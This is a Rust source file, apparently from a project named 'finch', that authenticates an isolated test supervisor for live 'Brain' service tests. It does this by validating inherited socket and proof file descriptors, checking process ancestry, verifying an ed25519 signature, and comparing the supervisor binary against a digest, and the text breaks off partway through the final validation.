//! Canonical durable Brain state, credentials, and client transports.
//!
//! Speculative/background activity is represented by `BrainRun` records in
//! the named Brain service. There is deliberately no second client-local
//! "Brain session" or hidden context-injection path here.

pub mod credential;
pub(crate) mod effect_audit_archive;
pub mod names;
pub mod remote;
pub mod store;
pub mod tasks;

#[doc(hidden)]
pub struct IsolatedTestProof {
    pub home: std::path::PathBuf,
    pub root: std::path::PathBuf,
    pub(crate) home_identity: (u64, u64),
    pub(crate) root_identity: (u64, u64),
    pub(crate) brain_addr: String,
    pub(crate) daemon_addr: String,
    pub(crate) ipc_socket: std::path::PathBuf,
    pub(crate) socket_root: std::path::PathBuf,
    pub(crate) socket_root_identity: (u64, u64),
    pub(crate) ipc_listener_identity: (u64, u64),
    pub(crate) supervisor_pid: u32,
    pub(crate) password_digest: String,
}

impl IsolatedTestProof {
    #[doc(hidden)]
    pub fn brain_address(&self) -> &str {
        &self.brain_addr
    }

    #[doc(hidden)]
    pub fn daemon_address(&self) -> &str {
        &self.daemon_addr
    }

    #[doc(hidden)]
    pub fn brain_password(&self) -> anyhow::Result<String> {
        let password = std::env::var("FINCH_TEST_BRAIN_PASSWORD")?;
        use sha2::Digest as _;
        anyhow::ensure!(
            hex::encode(sha2::Sha256::digest(password.as_bytes())) == self.password_digest,
            "live credential no longer matches the sealed supervisor authority"
        );
        Ok(password)
    }

    #[cfg(unix)]
    #[doc(hidden)]
    pub fn duplicate_brain_listener(&self) -> anyhow::Result<std::net::TcpListener> {
        duplicate_validated_listener(10, &self.brain_addr)
    }

    #[cfg(unix)]
    #[doc(hidden)]
    pub fn duplicate_daemon_listener(&self) -> anyhow::Result<std::net::TcpListener> {
        duplicate_validated_listener(11, &self.daemon_addr)
    }

    #[cfg(unix)]
    #[doc(hidden)]
    pub fn duplicate_ipc_listener(&self) -> anyhow::Result<std::os::unix::net::UnixListener> {
        duplicate_validated_ipc_listener(12, &self.ipc_socket, self.ipc_listener_identity)
    }
}

fn parse_identity(label: &str, identity: &str) -> anyhow::Result<(u64, u64)> {
    use anyhow::Context as _;

    let (device, inode) = identity
        .split_once(':')
        .with_context(|| format!("wrapper proof {label} identity has no separator"))?;
    Ok((
        device
            .parse()
            .with_context(|| format!("wrapper proof {label} device is not numeric"))?,
        inode
            .parse()
            .with_context(|| format!("wrapper proof {label} inode is not numeric"))?,
    ))
}

#[cfg(unix)]
fn duplicate_validated_ipc_listener(
    fd: i32,
    expected: &std::path::Path,
    expected_identity: (u64, u64),
) -> anyhow::Result<std::os::unix::net::UnixListener> {
    use std::os::fd::FromRawFd as _;

    let socket_option = |name: i32| -> anyhow::Result<i32> {
        let mut value = 0_i32;
        let mut length = std::mem::size_of::<i32>() as nix::libc::socklen_t;
        let result = unsafe {
            nix::libc::getsockopt(
                fd,
                nix::libc::SOL_SOCKET,
                name,
                (&mut value as *mut i32).cast(),
                &mut length,
            )
        };
        anyhow::ensure!(
            result == 0,
            "supervisor IPC descriptor FD {fd} getsockopt({name}) failed: {}",
            std::io::Error::last_os_error()
        );
        anyhow::ensure!(
            length as usize == std::mem::size_of::<i32>(),
            "supervisor IPC descriptor FD {fd} getsockopt({name}) returned length {length}"
        );
        Ok(value)
    };
    // macOS can return ENOPROTOOPT for repeated SO_ACCEPTCONN queries on an
    // inherited AF_UNIX listener. Listening is an availability property; the
    // signed inode, stream type, and kernel pathname below authenticate the
    // exact supervisor-created socket without relying on that advisory option.
    anyhow::ensure!(
        socket_option(nix::libc::SO_TYPE)? == nix::libc::SOCK_STREAM,
        "supervisor IPC descriptor is not a Unix stream socket"
    );
    let stat = nix::sys::stat::fstat(fd)?;
    anyhow::ensure!(
        (stat.st_dev as u64, stat.st_ino as u64) == expected_identity,
        "supervisor IPC listener identity does not match sealed authority"
    );
    let duplicate = unsafe { nix::libc::dup(fd) };
    anyhow::ensure!(duplicate >= 0, "supervisor IPC listener is unavailable");
    let listener = unsafe { std::os::unix::net::UnixListener::from_raw_fd(duplicate) };
    anyhow::ensure!(
        listener.local_addr()?.as_pathname() == Some(expected),
        "supervisor IPC listener path does not match sealed authority"
    );
    Ok(listener)
}

#[cfg(unix)]
fn duplicate_validated_listener(fd: i32, expected: &str) -> anyhow::Result<std::net::TcpListener> {
    use std::os::fd::{AsRawFd as _, FromRawFd as _};
    let socket_option = |name: i32| -> anyhow::Result<i32> {
        let mut value = 0_i32;
        let mut length = std::mem::size_of::<i32>() as nix::libc::socklen_t;
        let result = unsafe {
            nix::libc::getsockopt(
                fd,
                nix::libc::SOL_SOCKET,
                name,
                (&mut value as *mut i32).cast(),
                &mut length,
            )
        };
        if result != 0 {
            let error = std::io::Error::last_os_error();
            anyhow::bail!(
                "supervisor listener descriptor FD {fd} getsockopt({name}) failed \
                 with result {result}: {error}"
            );
        }
        anyhow::ensure!(
            length as usize == std::mem::size_of::<i32>(),
            "supervisor listener descriptor FD {fd} getsockopt({name}) returned invalid length \
             {length}"
        );
        Ok(value)
    };
    anyhow::ensure!(
        socket_option(nix::libc::SO_TYPE)? == nix::libc::SOCK_STREAM,
        "supervisor descriptor is not a TCP stream socket"
    );
    #[cfg(not(target_os = "macos"))]
    anyhow::ensure!(
        socket_option(nix::libc::SO_ACCEPTCONN)? != 0,
        "supervisor descriptor is not a listening TCP stream"
    );
    let duplicate = unsafe { nix::libc::dup(fd) };
    anyhow::ensure!(
        duplicate >= 0,
        "supervisor listener descriptor is unavailable"
    );
    let listener = unsafe { std::net::TcpListener::from_raw_fd(duplicate) };
    let address = listener.local_addr()?;
    anyhow::ensure!(
        address.to_string() == expected && address.ip().is_loopback() && address.port() != 0,
        "supervisor listener address does not match sealed authority"
    );
    #[cfg(target_os = "macos")]
    validate_macos_listener_challenge(listener.as_raw_fd(), address)?;
    Ok(listener)
}

#[cfg(target_os = "macos")]
fn validate_macos_listener_challenge(
    fd: i32,
    expected: std::net::SocketAddr,
) -> anyhow::Result<()> {
    use anyhow::Context as _;
    use std::io::{Read as _, Write as _};
    use std::os::fd::{AsRawFd as _, FromRawFd as _};
    use std::time::{Duration, Instant};

    static CHALLENGE_LOCK: std::sync::OnceLock<std::sync::Mutex<()>> = std::sync::OnceLock::new();
    let _process_lock = CHALLENGE_LOCK
        .get_or_init(|| std::sync::Mutex::new(()))
        .lock()
        .map_err(|_| anyhow::anyhow!("listener challenge lock is poisoned"))?;

    anyhow::ensure!(
        unsafe { nix::libc::flock(9, nix::libc::LOCK_EX) } == 0,
        "could not lock the sealed proof for listener challenge: {}",
        std::io::Error::last_os_error()
    );
    struct ProofLock;
    impl Drop for ProofLock {
        fn drop(&mut self) {
            unsafe {
                nix::libc::flock(9, nix::libc::LOCK_UN);
            }
        }
    }
    let _proof_lock = ProofLock;

    let original_flags = unsafe { nix::libc::fcntl(fd, nix::libc::F_GETFL) };
    anyhow::ensure!(
        original_flags >= 0,
        "could not inspect listener flags: {}",
        std::io::Error::last_os_error()
    );
    anyhow::ensure!(
        unsafe {
            nix::libc::fcntl(
                fd,
                nix::libc::F_SETFL,
                original_flags | nix::libc::O_NONBLOCK,
            )
        } == 0,
        "could not make listener nonblocking for challenge: {}",
        std::io::Error::last_os_error()
    );
    struct FileStatusGuard {
        fd: i32,
        original: i32,
        restored: bool,
    }
    impl FileStatusGuard {
        fn restore(mut self) -> anyhow::Result<()> {
            let result = unsafe { nix::libc::fcntl(self.fd, nix::libc::F_SETFL, self.original) };
            anyhow::ensure!(
                result == 0,
                "could not restore listener flags after challenge: {}",
                std::io::Error::last_os_error()
            );
            self.restored = true;
            Ok(())
        }
    }
    impl Drop for FileStatusGuard {
        fn drop(&mut self) {
            if !self.restored {
                unsafe {
                    nix::libc::fcntl(self.fd, nix::libc::F_SETFL, self.original);
                }
            }
        }
    }
    let flags = FileStatusGuard {
        fd,
        original: original_flags,
        restored: false,
    };

    let validation = (|| -> anyhow::Result<()> {
        let duplicate = unsafe { nix::libc::dup(fd) };
        anyhow::ensure!(
            duplicate >= 0,
            "could not duplicate listener for challenge: {}",
            std::io::Error::last_os_error()
        );
        let listener = unsafe { std::net::TcpListener::from_raw_fd(duplicate) };
        let timeout = Duration::from_millis(500);
        let mut client = std::net::TcpStream::connect_timeout(&expected, timeout)
            .context("sealed TCP socket did not accept a loopback challenge")?;
        client.set_write_timeout(Some(timeout))?;
        let nonce = *uuid::Uuid::new_v4().as_bytes();
        client.write_all(&nonce)?;

        let deadline = Instant::now() + timeout;
        let (mut accepted, accepted_peer) = loop {
            match listener.accept() {
                Ok(connection) => break connection,
                Err(error) if error.kind() == std::io::ErrorKind::WouldBlock => {
                    anyhow::ensure!(
                        Instant::now() < deadline,
                        "sealed TCP listener challenge timed out"
                    );
                    std::thread::sleep(Duration::from_millis(1));
                }
                Err(error) => return Err(error.into()),
            }
        };
        let accepted_flags = unsafe { nix::libc::fcntl(accepted.as_raw_fd(), nix::libc::F_GETFL) };
        anyhow::ensure!(
            accepted_flags >= 0,
            "could not inspect accepted challenge flags: {}",
            std::io::Error::last_os_error()
        );
        anyhow::ensure!(
            unsafe {
                nix::libc::fcntl(
                    accepted.as_raw_fd(),
                    nix::libc::F_SETFL,
                    accepted_flags & !nix::libc::O_NONBLOCK,
                )
            } == 0,
            "could not make accepted challenge stream blocking: {}",
            std::io::Error::last_os_error()
        );
        accepted.set_read_timeout(Some(timeout))?;
        let mut received = [0_u8; 16];
        accepted.read_exact(&mut received)?;
        anyhow::ensure!(
            received == nonce,
            "sealed TCP listener challenge nonce mismatch"
        );
        anyhow::ensure!(
            client.peer_addr()? == expected
                && accepted.local_addr()? == expected
                && client.local_addr()? == accepted_peer
                && accepted.peer_addr()? == client.local_addr()?,
            "sealed TCP listener challenge address pairing mismatch"
        );
        Ok(())
    })();
    let restored = flags.restore();
    restored?;
    validation
}

#[cfg(unix)]
fn restore_supervisor_listener(
    backup_fd: i32,
    target_fd: i32,
    expected: &str,
) -> anyhow::Result<()> {
    // Cargo may occupy FD10/FD11 with its jobserver before it execs libtest.
    // The supervisor therefore retains authenticated, non-CLOEXEC copies at
    // fixed high descriptors. The low descriptor is never authority: validate
    // the sealed backup first, overwrite FD10/FD11 unconditionally, and then
    // authenticate the production-facing descriptor a second time.
    drop(duplicate_validated_listener(backup_fd, expected)?);
    anyhow::ensure!(
        unsafe { nix::libc::dup2(backup_fd, target_fd) } == target_fd,
        "could not restore supervisor listener descriptor"
    );
    anyhow::ensure!(
        unsafe { nix::libc::fcntl(target_fd, nix::libc::F_SETFD, 0) } == 0,
        "could not make restored supervisor listener inheritable"
    );
    drop(duplicate_validated_listener(target_fd, expected)?);
    Ok(())
}

#[cfg(unix)]
fn restore_supervisor_ipc_listener(
    backup_fd: i32,
    target_fd: i32,
    expected: &std::path::Path,
    expected_identity: (u64, u64),
) -> anyhow::Result<()> {
    drop(duplicate_validated_ipc_listener(
        backup_fd,
        expected,
        expected_identity,
    )?);
    anyhow::ensure!(
        unsafe { nix::libc::dup2(backup_fd, target_fd) } == target_fd,
        "could not restore supervisor IPC listener descriptor"
    );
    anyhow::ensure!(
        unsafe { nix::libc::fcntl(target_fd, nix::libc::F_SETFD, 0) } == 0,
        "could not make restored supervisor IPC listener inheritable"
    );
    drop(duplicate_validated_ipc_listener(
        target_fd,
        expected,
        expected_identity,
    )?);
    Ok(())
}

fn process_descends_from(ancestor: u32) -> anyhow::Result<bool> {
    #[cfg(target_os = "linux")]
    fn parent(pid: u32) -> anyhow::Result<u32> {
        use std::io::Read as _;

        let mut file = std::fs::File::open(format!("/proc/{pid}/stat"))?;
        let mut bytes = Vec::new();
        file.by_ref().take(4097).read_to_end(&mut bytes)?;
        anyhow::ensure!(bytes.len() <= 4096, "process ancestry record is too large");
        let record = std::str::from_utf8(&bytes)?;
        let suffix = record
            .rsplit_once(") ")
            .ok_or_else(|| anyhow::anyhow!("process ancestry record is malformed"))?
            .1;
        Ok(suffix
            .split_whitespace()
            .nth(1)
            .ok_or_else(|| anyhow::anyhow!("process ancestry record has no parent"))?
            .parse()?)
    }

    #[cfg(target_os = "macos")]
    fn parent(pid: u32) -> anyhow::Result<u32> {
        let mut information: nix::libc::proc_bsdinfo = unsafe { std::mem::zeroed() };
        let expected = std::mem::size_of_val(&information) as nix::libc::c_int;
        let length = unsafe {
            nix::libc::proc_pidinfo(
                pid as nix::libc::c_int,
                nix::libc::PROC_PIDTBSDINFO,
                0,
                (&mut information as *mut nix::libc::proc_bsdinfo).cast(),
                expected,
            )
        };
        anyhow::ensure!(length == expected, "could not verify supervisor ancestry");
        Ok(information.pbi_ppid)
    }

    let current_pid = std::process::id();
    if ancestor == current_pid {
        return Ok(false);
    }
    let mut pid = current_pid;
    // The proof issuer must be an actual ancestor. Accepting the current
    // process would let a test manufacture a self-signed environment and FD.
    pid = parent(pid)?;
    for _ in 0..256 {
        if pid <= 1 {
            return Ok(false);
        }
        if pid == ancestor {
            return Ok(true);
        }
        pid = parent(pid)?;
    }
    anyhow::bail!("process ancestry exceeds its depth bound")
}

#[cfg(unix)]
fn supervisor_verifying_key(expected_pid: u32) -> anyhow::Result<ed25519_dalek::VerifyingKey> {
    use std::os::fd::FromRawFd as _;
    use std::os::unix::net::UnixDatagram;

    anyhow::ensure!(
        std::env::var("FINCH_BRAIN_TEST_AUTH_FD").as_deref() == Ok("109"),
        "live Brain tests require the supervisor authentication descriptor"
    );
    let socket_type = unsafe {
        let mut value: nix::libc::c_int = 0;
        let mut length = std::mem::size_of_val(&value) as nix::libc::socklen_t;
        let result = nix::libc::getsockopt(
            109,
            nix::libc::SOL_SOCKET,
            nix::libc::SO_TYPE,
            (&mut value as *mut nix::libc::c_int).cast(),
            &mut length,
        );
        anyhow::ensure!(
            result == 0,
            "supervisor authentication descriptor is unavailable"
        );
        value
    };
    anyhow::ensure!(
        socket_type == nix::libc::SOCK_DGRAM,
        "supervisor authentication descriptor has the wrong type"
    );
    #[cfg(target_os = "linux")]
    let peer_pid = unsafe {
        let mut credential: nix::libc::ucred = std::mem::zeroed();
        let mut length = std::mem::size_of_val(&credential) as nix::libc::socklen_t;
        anyhow::ensure!(
            nix::libc::getsockopt(
                109,
                nix::libc::SOL_SOCKET,
                nix::libc::SO_PEERCRED,
                (&mut credential as *mut nix::libc::ucred).cast(),
                &mut length,
            ) == 0,
            "supervisor authentication peer is unavailable"
        );
        credential.pid
    };
    #[cfg(target_os = "macos")]
    let peer_pid = unsafe {
        let mut pid: nix::libc::pid_t = 0;
        let mut length = std::mem::size_of_val(&pid) as nix::libc::socklen_t;
        anyhow::ensure!(
            nix::libc::getsockopt(
                109,
                nix::libc::SOL_LOCAL,
                nix::libc::LOCAL_PEERPID,
                (&mut pid as *mut nix::libc::pid_t).cast(),
                &mut length,
            ) == 0,
            "supervisor authentication peer is unavailable"
        );
        pid
    };
    #[cfg(not(any(target_os = "linux", target_os = "macos")))]
    anyhow::bail!("supervisor authentication is unsupported on this platform");
    anyhow::ensure!(
        peer_pid > 1 && peer_pid as u32 == expected_pid && process_descends_from(expected_pid)?,
        "proof authentication peer is not the ancestor test supervisor"
    );

    let duplicate = unsafe { nix::libc::fcntl(109, nix::libc::F_DUPFD_CLOEXEC, 200) };
    anyhow::ensure!(
        duplicate >= 0,
        "could not duplicate proof authentication descriptor"
    );
    let socket = unsafe { UnixDatagram::from_raw_fd(duplicate) };
    let timeout = Some(std::time::Duration::from_secs(2));
    socket.set_read_timeout(timeout)?;
    socket.set_write_timeout(timeout)?;
    socket.send(b"finch-proof-key-v1")?;
    let mut key = [0_u8; 32];
    anyhow::ensure!(
        socket.recv(&mut key)? == key.len(),
        "supervisor returned an invalid proof-auth response"
    );
    Ok(ed25519_dalek::VerifyingKey::from_bytes(&key)?)
}

#[cfg(unix)]
fn read_proof_at(proof: &std::fs::File) -> anyhow::Result<Vec<u8>> {
    use std::os::unix::fs::FileExt as _;

    let length: usize = proof.metadata()?.len().try_into()?;
    anyhow::ensure!(length <= 64 * 1024, "wrapper proof is unexpectedly large");
    let mut contents = vec![0_u8; length];
    let mut offset = 0;
    while offset < contents.len() {
        let count = proof.read_at(&mut contents[offset..], offset as u64)?;
        anyhow::ensure!(count != 0, "wrapper proof was truncated while reading");
        offset += count;
    }
    Ok(contents)
}

#[cfg(unix)]
fn duplicate_validated_proof(fd: std::os::fd::RawFd) -> anyhow::Result<std::fs::File> {
    use std::os::fd::FromRawFd as _;
    use std::os::unix::fs::MetadataExt as _;

    let flags = unsafe { nix::libc::fcntl(fd, nix::libc::F_GETFL) };
    anyhow::ensure!(
        flags >= 0 && flags & nix::libc::O_ACCMODE == nix::libc::O_RDONLY,
        "wrapper proof descriptor is writable or unavailable"
    );
    let duplicate = unsafe { nix::libc::dup(fd) };
    anyhow::ensure!(duplicate >= 0, "wrapper proof descriptor is unavailable");
    let proof = unsafe { std::fs::File::from_raw_fd(duplicate) };
    let metadata = proof.metadata()?;
    anyhow::ensure!(
        metadata.is_file()
            && metadata.nlink() == 0
            && metadata.uid() == nix::unistd::geteuid().as_raw()
            && metadata.mode() & 0o777 == 0o400,
        "wrapper proof descriptor does not identify the parent-owned sealed file"
    );
    Ok(proof)
}

/// Confirm the supervisor executable is still the image that minted the proof.
///
/// Both the inode pair and the content digest, always, from one descriptor.
///
/// The inode pair alone was too weak in one direction and too brittle in the
/// other. Too weak: an in-place overwrite keeps the inode, so a different
/// program at the same inode passed. Too brittle: `finch-test-supervisor` is a
/// Cargo target, and Cargo replaces a binary by writing a new file and renaming
/// it into place, which allocates a new inode — so a relink underneath the
/// running supervisor produced `supervisor executable identity changed`,
/// indistinguishable from an attack (#259).
///
/// Do not turn the digest into a fallback consulted only when the inode
/// differs. That is what an earlier version of this function did, and it made
/// the check strictly weaker than the one it replaced: the same-inode branch
/// returned before the digest was ever computed, so the overwrite case stayed
/// accepted. Both are checked, and one open serves both — two path lookups gave
/// an attacker with write access to the target directory a window to have the
/// `stat` see one file and the read see another.
///
/// A relink of a byte-identical image is accepted, because it is the same
/// program. A relink that changes the bytes is not, and cannot be: at that
/// point a rebuild and a substitution are genuinely indistinguishable from
/// here, so the diagnostic states what was observed and names both causes
/// rather than asserting one. Measured, not assumed: `cargo test` unifies
/// features with dev-dependencies, so its uplifted binary differs from
/// `cargo build --bin`'s for this very target. The pinned copy is what makes
/// the relink case not arise in the first place.
#[cfg(unix)]
fn content_addressed_supervisor_digest(executable: &std::path::Path) -> Option<&str> {
    let name = executable.file_name()?.to_str()?;
    let digest = name.strip_prefix("finch-test-supervisor-pinned-sha256-")?;
    (digest.len() == 64
        && digest
            .bytes()
            .all(|byte| byte.is_ascii_digit() || (b'a'..=b'f').contains(&byte)))
    .then_some(digest)
}

#[cfg(unix)]
fn verify_supervisor_image(
    recorded_identity: &str,
    recorded_digest: &str,
    executable: &std::path::Path,
) -> anyhow::Result<()> {
    use anyhow::Context as _;
    use sha2::{Digest as _, Sha256};
    use std::io::Read as _;
    use std::os::unix::fs::{MetadataExt as _, OpenOptionsExt as _};

    let mut file = std::fs::OpenOptions::new()
        .read(true)
        .custom_flags(nix::libc::O_NOFOLLOW)
        .open(executable)
        .with_context(|| {
            format!(
                "supervisor executable {} could not be opened to verify its image",
                executable.display()
            )
        })?;
    // `fstat` and the read both go through this descriptor, so they cannot
    // observe two different files.
    let metadata = file.metadata()?;
    let identity = format!("{}:{}", metadata.dev(), metadata.ino());
    let mut image = Vec::new();
    file.read_to_end(&mut image)?;
    let digest = hex::encode(Sha256::digest(&image));

    if let Some(path_digest) = content_addressed_supervisor_digest(executable) {
        anyhow::ensure!(
            path_digest == digest,
            "content-addressed supervisor executable {} does not contain the image named by its path",
            executable.display()
        );
    }

    if digest == recorded_digest {
        if identity != recorded_identity {
            tracing::warn!(
                executable = %executable.display(),
                "supervisor executable was relinked between proof mint and \
                 verification; the image is byte-identical, so the proof holds"
            );
        }
        return Ok(());
    }

    anyhow::ensure!(
        identity != recorded_identity,
        "supervisor executable {} was overwritten in place: same inode, \
         different image. A rebuild cannot do this — Cargo renames a new file \
         into place rather than writing through an existing one.",
        executable.display()
    );
    anyhow::bail!(
        "supervisor executable {} is not the image that minted this proof \
         (recorded {recorded_identity}, found {identity}; the contents differ \
         too). Either the program was replaced, or this path is a Cargo target \
         that was relinked by the command running under it — a relink changes \
         the bytes, so the two cannot be told apart from here. Run through \
         scripts/test_brains.sh, which pins a copy Cargo never writes.",
        executable.display()
    );
}

/// Is this the supervisor binary belonging to the current build directory?
///
/// Either legacy name and a checked content-addressed pin are accepted.
///
/// Preferring the pinned copy meant that the moment it existed, any launcher
/// that pointed `FINCH_TEST_SUPERVISOR_BIN` at the plain path — `test_server.sh`
/// and `test_tool_passthrough.sh` both do — recorded that path in its proof and
/// was then told the issuer was not an ancestor test supervisor. Those
/// launchers were unaffected by #259 before, because they run the `finch`
/// binary rather than `cargo test`, so nothing relinked the supervisor
/// underneath them; creating the pinned copy would have broken them.
///
/// Maintained launchers use an immutable `pinned-sha256-<digest>` sibling. Its
/// digest-to-name binding is checked from the same descriptor that verifies
/// the proof, so allowing the name pattern does not turn arbitrary target
/// files into supervisor authority.
fn is_expected_supervisor_executable(candidate: &std::path::Path) -> anyhow::Result<bool> {
    let test_executable = std::env::current_exe()?.canonicalize()?;
    let mut directory = test_executable
        .parent()
        .ok_or_else(|| anyhow::anyhow!("test executable has no parent"))?;
    if directory.file_name().is_some_and(|name| name == "deps") {
        directory = directory
            .parent()
            .ok_or_else(|| anyhow::anyhow!("test dependency directory has no parent"))?;
    }
    let names: [&str; 2] = if cfg!(windows) {
        [
            "finch-test-supervisor-pinned.exe",
            "finch-test-supervisor.exe",
        ]
    } else {
        ["finch-test-supervisor-pinned", "finch-test-supervisor"]
    };
    for name in names {
        let path = directory.join(name);
        if path.is_file() && path.canonicalize()? == candidate {
            return Ok(true);
        }
    }
    Ok(candidate.parent() == Some(directory)
        && candidate.is_file()
        && content_addressed_supervisor_digest(candidate).is_some())
}

#[cfg(target_os = "linux")]
fn process_executable(pid: u32) -> anyhow::Result<std::path::PathBuf> {
    Ok(std::fs::read_link(format!("/proc/{pid}/exe"))?)
}

#[cfg(target_os = "macos")]
fn process_executable(pid: u32) -> anyhow::Result<std::path::PathBuf> {
    use std::os::unix::ffi::OsStringExt as _;
    let mut buffer = vec![0_u8; nix::libc::PROC_PIDPATHINFO_MAXSIZE as usize];
    let length = unsafe {
        nix::libc::proc_pidpath(
            pid as nix::libc::c_int,
            buffer.as_mut_ptr().cast(),
            buffer.len() as u32,
        )
    };
    anyhow::ensure!(length > 0, "could not resolve supervisor executable");
    buffer.truncate(length as usize);
    Ok(std::path::PathBuf::from(std::ffi::OsString::from_vec(
        buffer,
    )))
}

fn isolated_test_proof_with_encoded() -> anyhow::Result<(IsolatedTestProof, Vec<u8>)> {
    use anyhow::Context as _;

    // FD9 is the conventional production-facing descriptor and dup2 replaces
    // it process-wide. Serialize the complete restore and authentication
    // transaction so concurrent constructors cannot close FD9 between another
    // thread's fcntl, metadata, proof read, and signature/peer validation.
    static PROOF_VALIDATION_LOCK: std::sync::Mutex<()> = std::sync::Mutex::new(());
    let _proof_validation = PROOF_VALIDATION_LOCK
        .lock()
        .map_err(|_| anyhow::anyhow!("wrapper proof validation lock was poisoned"))?;

    anyhow::ensure!(
        std::env::var("FINCH_BRAIN_TEST_ISOLATED").as_deref() == Ok("1"),
        "live Brain tests require scripts/test_brains.sh"
    );
    anyhow::ensure!(
        std::env::var("FINCH_BRAIN_TEST_PROOF_FD").as_deref() == Ok("9"),
        "live Brain tests require the wrapper proof descriptor"
    );
    #[cfg(unix)]
    let proof = {
        use std::os::unix::fs::MetadataExt as _;

        anyhow::ensure!(
            std::env::var("FINCH_BRAIN_TEST_PROOF_BACKUP_FD").as_deref() == Ok("108"),
            "live Brain tests require the sealed wrapper proof backup"
        );
        let backup = duplicate_validated_proof(108)?;
        anyhow::ensure!(
            unsafe { nix::libc::dup2(108, 9) } == 9,
            "could not restore the wrapper proof descriptor"
        );
        anyhow::ensure!(
            unsafe { nix::libc::fcntl(9, nix::libc::F_SETFD, 0) } == 0,
            "could not make the restored wrapper proof inheritable"
        );
        let proof = duplicate_validated_proof(9)?;
        let backup_metadata = backup.metadata()?;
        let proof_metadata = proof.metadata()?;
        anyhow::ensure!(
            (backup_metadata.dev(), backup_metadata.ino())
                == (proof_metadata.dev(), proof_metadata.ino()),
            "restored wrapper proof does not match the sealed backup"
        );
        proof
    };
    #[cfg(not(unix))]
    let proof: std::fs::File =
        { anyhow::bail!("Brain test supervisor authority is supported only on Unix") };
    #[cfg(unix)]
    let encoded = read_proof_at(&proof)?;
    #[cfg(not(unix))]
    let encoded: Vec<u8> = unreachable!();
    let final_newline = encoded
        .strip_suffix(b"\n")
        .context("wrapper proof is not newline terminated")?;
    let signature_start = final_newline
        .iter()
        .rposition(|byte| *byte == b'\n')
        .map(|index| index + 1)
        .context("wrapper proof is missing its signature")?;
    let signed = &encoded[..signature_start];
    let signature_hex = std::str::from_utf8(&final_newline[signature_start..])?;
    let signature_bytes: [u8; 64] = hex::decode(signature_hex)?
        .try_into()
        .map_err(|_| anyhow::anyhow!("wrapper proof has an invalid signature length"))?;
    let expected_supervisor_pid: u32 = std::env::var("FINCH_TEST_SUPERVISOR_PID")?.parse()?;
    #[cfg(unix)]
    {
        supervisor_verifying_key(expected_supervisor_pid)?.verify_strict(
            signed,
            &ed25519_dalek::Signature::from_bytes(&signature_bytes),
        )?;
    }
    let contents = std::str::from_utf8(signed)?;
    let mut lines = contents.lines();
    let token = lines.next().context("wrapper proof is missing its nonce")?;
    let home = std::path::PathBuf::from(
        lines
            .next()
            .context("wrapper proof is missing its HOME identity")?,
    );
    let root = std::path::PathBuf::from(
        lines
            .next()
            .context("wrapper proof is missing its Brain-root identity")?,
    );
    let home_identity = lines
        .next()
        .context("wrapper proof is missing its HOME inode identity")?;
    let root_identity = lines
        .next()
        .context("wrapper proof is missing its Brain-root inode identity")?;
    let brain_addr = lines
        .next()
        .context("wrapper proof is missing its Brain-listener authority")?
        .to_owned();
    let daemon_addr = lines
        .next()
        .context("wrapper proof is missing its daemon-listener authority")?
        .to_owned();
    let password_digest = lines
        .next()
        .context("wrapper proof is missing its password authority")?;
    let ipc_socket = std::path::PathBuf::from(
        lines
            .next()
            .context("wrapper proof is missing its IPC-socket authority")?,
    );
    let socket_root = std::path::PathBuf::from(
        lines
            .next()
            .context("wrapper proof is missing its socket-root authority")?,
    );
    let socket_root_identity = lines
        .next()
        .context("wrapper proof is missing its socket-root identity")?;
    let ipc_listener_identity = lines
        .next()
        .context("wrapper proof is missing its IPC-listener identity")?;
    let supervisor_pid: u32 = lines
        .next()
        .context("wrapper proof is missing its supervisor identity")?
        .parse()
        .context("wrapper proof supervisor PID is not numeric")?;
    let supervisor_executable = std::path::PathBuf::from(
        lines
            .next()
            .context("wrapper proof is missing its supervisor executable")?,
    );
    let supervisor_identity = lines
        .next()
        .context("wrapper proof is missing its supervisor executable identity")?;
    let supervisor_digest = lines
        .next()
        .context("wrapper proof is missing its supervisor executable digest")?;
    anyhow::ensure!(lines.next().is_none(), "wrapper proof has trailing fields");
    anyhow::ensure!(
        std::env::var("FINCH_BRAIN_TEST_TOKEN").as_deref() == Ok(token),
        "wrapper proof nonce does not match the inherited contract"
    );
    anyhow::ensure!(
        std::env::var("FINCH_TEST_SUPERVISOR_PID")
            .ok()
            .and_then(|value| value.parse().ok())
            == Some(supervisor_pid)
            && expected_supervisor_pid == supervisor_pid
            && process_descends_from(supervisor_pid)?
            && process_executable(supervisor_pid)?.canonicalize()? == supervisor_executable
            && is_expected_supervisor_executable(&supervisor_executable)?,
        "proof issuer is not an ancestor test supervisor"
    );
    #[cfg(unix)]
    verify_supervisor_image(
        supervisor_identity,
        supervisor_digest,
        &supervisor_executable,
    )?;
    #[cfg(unix)]
    {
        use std::os::fd::AsRawFd as _;
        let flags = unsafe { nix::libc::fcntl(proof.as_raw_fd(), nix::libc::F_GETFL) };
        anyhow::ensure!(
            flags >= 0 && flags & nix::libc::O_ACCMODE == nix::libc::O_RDONLY,
            "wrapper proof descriptor is writable"
        );
        anyhow::ensure!(
            std::env::var("FINCH_TEST_BRAIN_LISTENER_FD").as_deref() == Ok("10")
                && std::env::var("FINCH_TEST_DAEMON_LISTENER_FD").as_deref() == Ok("11")
                && std::env::var("FINCH_TEST_IPC_LISTENER_FD").as_deref() == Ok("12")
                && std::env::var("FINCH_TEST_BRAIN_LISTENER_BACKUP_FD").as_deref() == Ok("110")
                && std::env::var("FINCH_TEST_DAEMON_LISTENER_BACKUP_FD").as_deref() == Ok("111")
                && std::env::var("FINCH_TEST_IPC_LISTENER_BACKUP_FD").as_deref() == Ok("112"),
            "sealed listener authority does not match supervisor-owned listeners"
        );
        restore_supervisor_listener(110, 10, &brain_addr)?;
        restore_supervisor_listener(111, 11, &daemon_addr)?;
        restore_supervisor_ipc_listener(
            112,
            12,
            &ipc_socket,
            parse_identity("IPC listener", ipc_listener_identity)?,
        )?;
    }
    anyhow::ensure!(
        std::env::var_os("HOME").as_deref() == Some(home.as_os_str())
            && std::env::var_os("FINCH_BRAIN_TEST_HOME").as_deref() == Some(home.as_os_str())
            && std::env::var_os("FINCH_BRAIN_TEST_ROOT").as_deref() == Some(root.as_os_str()),
        "wrapper proof does not match the active HOME and Brain root"
    );
    use sha2::Digest as _;
    let environment_password = std::env::var("FINCH_TEST_BRAIN_PASSWORD").unwrap_or_default();
    anyhow::ensure!(
        std::env::var("FINCH_TEST_BRAIN_ADDR").unwrap_or_default() == brain_addr
            && std::env::var("FINCH_TEST_DAEMON_ADDR").unwrap_or_default() == daemon_addr
            && hex::encode(sha2::Sha256::digest(environment_password.as_bytes()))
                == password_digest
